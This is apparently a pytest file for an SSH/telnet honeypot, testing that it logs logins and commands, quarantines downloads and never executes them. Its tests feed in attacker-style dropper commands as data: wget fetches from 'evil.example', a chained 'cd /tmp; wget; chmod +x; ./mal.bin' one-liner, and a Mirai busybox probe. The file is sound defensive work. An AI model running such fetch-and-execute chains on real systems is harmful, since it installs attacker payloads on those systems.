"""Tests for SessionManager (honeypot/session/manager.py).

Uses a local http.server to stand in for dropper infrastructure so a full
command -> download -> quarantine -> logged-event round trip can be tested
without touching the real network. Verifies login-attempt logging, command
logging, and that a wget command produces both a file.download "requested"
event and a follow-up outcome event with hashes.
"""
from __future__ import annotations

import asyncio
import http.server
import json
import tempfile
import threading
from pathlib import Path

import pytest

from honeypot.config.schema import (
    CredentialPolicy,
    FetcherConfig,
    HoneypotConfig,
    ListenerConfig,
    LoggingConfig,
    PersonaConfig,
)
from honeypot.logging.events import EventLogger
from honeypot.session.manager import SessionManager


class _Server:
    def __init__(self, directory: Path) -> None:
        handler = lambda *a, **kw: http.server.SimpleHTTPRequestHandler(*a, directory=str(directory), **kw)
        self.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()

    @property
    def port(self) -> int:
        return self.httpd.server_address[1]

    def url(self, path: str) -> str:
        return f"http://127.0.0.1:{self.port}/{path}"

    def stop(self) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()


@pytest.fixture()
def config(tmp_path) -> HoneypotConfig:
    return HoneypotConfig(
        persona=PersonaConfig(arch="riscv64"),
        listeners=ListenerConfig(),
        credentials=CredentialPolicy(accept_any=True),
        fetcher=FetcherConfig(
            quarantine_dir=tmp_path / "quarantine",
            jobs_dir=tmp_path / "jobs",
            # This fixture's tests fetch from a local _Server standing in
            # for dropper infrastructure (127.0.0.1) -- the SSRF guard
            # would otherwise (correctly) block every one of them. See
            # test_ssrf_guard.py for dedicated tests of the guard itself.
            block_private_networks=False,
        ),
        logging=LoggingConfig(
            log_dir=tmp_path / "logs",
            transcript_dir=tmp_path / "transcripts",
        ),
    )


def _read_events(config: HoneypotConfig) -> list[dict]:
    path = Path(config.logging.log_dir) / config.logging.json_log_filename
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def test_login_accept_any_logs_success(config):
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "ssh", config, logger)
    session.on_connect()
    assert session.try_login("root", "anything") is True
    events = _read_events(config)
    assert events[0]["event"] == "session.connect"
    assert events[1]["event"] == "login.success"
    assert events[1]["username"] == "root"


def test_whoami_reflects_the_session_login_username(config):
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "ssh", config, logger)
    session.on_connect()
    assert session.try_login("admin", "anything") is True
    output = asyncio.run(session.handle_command("whoami"))
    assert output == "admin"


def test_login_rejects_when_not_in_allow_list(tmp_path, config):
    config.credentials = CredentialPolicy(accept_any=False, allow_list=[])
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "ssh", config, logger)
    assert session.try_login("root", "root") is False
    events = _read_events(config)
    assert events[0]["event"] == "login.failed"


def test_command_input_is_logged():
    with tempfile.TemporaryDirectory() as d:
        tmp_path = Path(d)
        cfg = HoneypotConfig(
            persona=PersonaConfig(arch="riscv64"),
            fetcher=FetcherConfig(quarantine_dir=tmp_path / "q", jobs_dir=tmp_path / "j"),
            logging=LoggingConfig(log_dir=tmp_path / "logs", transcript_dir=tmp_path / "t"),
        )
        logger = EventLogger(cfg.logging.log_dir, cfg.logging.json_log_filename)
        session = SessionManager("1.2.3.4", 5555, 2222, "telnet", cfg, logger)
        output = asyncio.run(session.handle_command("uname -a"))
        assert "riscv64" in output
        events = _read_events(cfg)
        command_events = [e for e in events if e["event"] == "command.input"]
        assert command_events[0]["command"] == "uname"


def test_wget_download_round_trip(config):
    with tempfile.TemporaryDirectory() as d:
        serve_dir = Path(d)
        content = b"payload-bytes"
        (serve_dir / "mal.bin").write_bytes(content)
        server = _Server(serve_dir)
        try:
            logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
            session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
            output = asyncio.run(session.handle_command(f"wget {server.url('mal.bin')} -O mal.bin"))
        finally:
            server.stop()

    assert "saved" in output
    events = _read_events(config)
    download_events = [e for e in events if e["event"] == "file.download"]
    assert download_events[0]["outcome"] == "requested"
    assert download_events[1]["outcome"] == "success"
    assert download_events[1]["sha256"] is not None
    quarantined = list(Path(config.fetcher.quarantine_dir).glob("*.bin"))
    assert len(quarantined) == 1
    assert quarantined[0].read_bytes() == content


def test_execution_attempt_is_logged_and_never_runs_anything(config):
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
    output = asyncio.run(session.handle_command("chmod +x mal.bin"))
    assert output == ""
    output = asyncio.run(session.handle_command("./mal.bin"))
    assert output == ""
    events = _read_events(config)
    exec_events = [e for e in events if e["event"] == "file.execution_attempt"]
    assert len(exec_events) == 2


def test_exit_command_sets_should_exit(config):
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
    asyncio.run(session.handle_command("exit"))
    assert session.should_exit is True


def test_queued_mode_never_calls_fetch_and_quarantine_in_process(config, monkeypatch):
    """"queued" mode must enqueue + poll, never fetch itself -- this is the
    property the docker-compose network-isolation split actually depends on."""
    import honeypot.session.manager as manager_mod

    config.fetcher.mode = "queued"

    def _should_not_be_called(*args, **kwargs):
        raise AssertionError("queued mode must never call fetch_and_quarantine in-process")

    monkeypatch.setattr(manager_mod, "fetch_and_quarantine", _should_not_be_called)

    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)

    async def _drive():
        task = asyncio.create_task(session.handle_command("wget http://evil.example/mal.bin"))
        await asyncio.sleep(0.2)  # let it enqueue and start polling
        jobs_dir = Path(config.fetcher.jobs_dir)
        pending = list(jobs_dir.glob("*.json"))
        assert len(pending) == 1, "job should have been enqueued to the shared jobs_dir"
        job_id = pending[0].stem

        # Simulate the separate fetcher worker: claim the job and drop a result.
        from honeypot.fetcher.queue import claim_pending_jobs
        claimed = claim_pending_jobs(jobs_dir)
        assert len(claimed) == 1
        job_path, job = claimed[0]
        assert job.job_id == job_id
        result_path = job_path.with_suffix(".result.json")
        result_path.write_text(json.dumps({
            "success": True, "sha256": "deadbeef", "md5": "cafebabe",
            "size_bytes": 42, "detected_type": "elf", "detected_bitness": 64,
            "detected_machine": "EM_RISCV", "arch_mismatch": False,
            "quarantine_path": "/fetcher/side/deadbeef.bin", "error": None,
        }))

        return await task

    output = asyncio.run(_drive())
    assert "saved" in output
    events = _read_events(config)
    download_events = [e for e in events if e["event"] == "file.download"]
    assert download_events[-1]["outcome"] == "success"
    assert download_events[-1]["sha256"] == "deadbeef"


def test_queued_mode_times_out_gracefully_if_no_worker_responds(config):
    config.fetcher.mode = "queued"
    config.fetcher.timeout_seconds = 0.2
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)

    output = asyncio.run(session.handle_command("wget http://evil.example/mal.bin"))

    assert "timed out" in output
    events = _read_events(config)
    download_events = [e for e in events if e["event"] == "file.download"]
    assert download_events[-1]["outcome"] == "failed"


def test_chained_dropper_one_liner_downloads_and_logs_each_step(config):
    """`cd /tmp || ...; wget ...; chmod +x ...; ./x` is how droppers actually
    arrive -- a single dispatch() of that line used to miss the wget."""
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "mal.bin").write_bytes(b"payload-bytes")
        server = _Server(Path(d))
        try:
            logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
            session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
            line = (f"cd /tmp || cd /var/run; wget {server.url('mal.bin')} -O mal.bin; "
                    "chmod +x mal.bin; ./mal.bin")
            output = asyncio.run(session.handle_command(line))
        finally:
            server.stop()

    assert "saved" in output
    events = _read_events(config)
    assert [e["outcome"] for e in events if e["event"] == "file.download"] == ["requested", "success"]
    assert len([e for e in events if e["event"] == "file.execution_attempt"]) == 2
    assert len(list(Path(config.fetcher.quarantine_dir).glob("*.bin"))) == 1


def test_or_alternative_is_skipped_when_first_download_succeeds(config):
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / "mal.bin").write_bytes(b"payload-bytes")
        server = _Server(Path(d))
        try:
            logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
            session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
            url = server.url("mal.bin")
            asyncio.run(session.handle_command(f"wget {url} -O a || curl -o a {url}"))
        finally:
            server.stop()

    requested = [e for e in _read_events(config)
                 if e["event"] == "file.download" and e["outcome"] == "requested"]
    assert len(requested) == 1


def test_or_alternative_runs_when_first_download_fails(config):
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
    asyncio.run(session.handle_command(
        "wget http://nonexistent.invalid/a -O a || wget http://nonexistent.invalid/b -O b"))
    requested = [e for e in _read_events(config)
                 if e["event"] == "file.download" and e["outcome"] == "requested"]
    assert len(requested) == 2


def test_and_chain_stops_after_failure(config):
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
    output = asyncio.run(session.handle_command("cd /nonexistent && echo unreachable"))
    assert "unreachable" not in output


def test_mirai_probe_line_gets_applet_not_found_reply(config):
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
    output = asyncio.run(session.handle_command("ls /home; /bin/busybox BOTNET"))
    assert output.splitlines()[-1] == "BOTNET: applet not found"


def test_exit_in_a_chain_stops_later_segments(config):
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
    output = asyncio.run(session.handle_command("exit; echo after"))
    assert session.should_exit and "after" not in output


def test_per_session_download_cap_stops_fetch_fan_out(config):
    """One session must not be able to make unbounded outbound requests at a
    third party (`wget A; wget B; ...` over and over)."""
    config.fetcher.max_downloads_per_session = 3
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
    line = "; ".join(f"wget http://nonexistent.invalid/f{i} -O f{i}" for i in range(10))
    asyncio.run(session.handle_command(line))
    asyncio.run(session.handle_command("wget http://nonexistent.invalid/again -O again"))

    downloads = [e for e in _read_events(config) if e["event"] == "file.download"]
    assert len([e for e in downloads if e["outcome"] == "requested"]) == 3
    capped = [e for e in downloads if e.get("error") == "per-session download limit reached"]
    assert len(capped) == 8  # 7 left in the first line + the follow-up line


def test_capped_download_still_looks_like_an_ordinary_wget_failure(config):
    config.fetcher.max_downloads_per_session = 0
    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
    output = asyncio.run(session.handle_command("wget http://nonexistent.invalid/x -O x"))
    assert output == "Connecting to nonexistent.invalid\nwget: can't connect to remote host"
    assert "limit" not in output


def test_http_404_is_reported_like_busybox_wget_and_logged_as_failed(config):
    with tempfile.TemporaryDirectory() as d:
        server = _Server(Path(d))            # serves an empty directory: everything is a 404
        try:
            logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
            session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
            output = asyncio.run(session.handle_command(f"wget {server.url('telnetd')}"))
        finally:
            server.stop()

    assert output.endswith("wget: server returned error: HTTP/1.1 404 Not Found")
    outcome = [e for e in _read_events(config) if e["event"] == "file.download" and e["outcome"] != "requested"]
    assert len(outcome) == 1 and outcome[0]["outcome"] == "failed"
    assert outcome[0]["http_status"] == 404 and outcome[0]["error"] == "HTTP 404"
    assert list(Path(config.fetcher.quarantine_dir).glob("*.bin")) == []


def test_wget_error_text_for_http_statuses():
    from honeypot.session.manager import _wget_error_text
    assert _wget_error_text("HTTP 503") == "server returned error: HTTP/1.1 503 Service Unavailable"
    assert _wget_error_text("HTTP 599") == "server returned error: HTTP/1.1 599 Error"
    # A network-level failure still collapses to the one generic line.
    assert _wget_error_text("Cannot connect to host 10.0.0.5:22") == "can't connect to remote host"
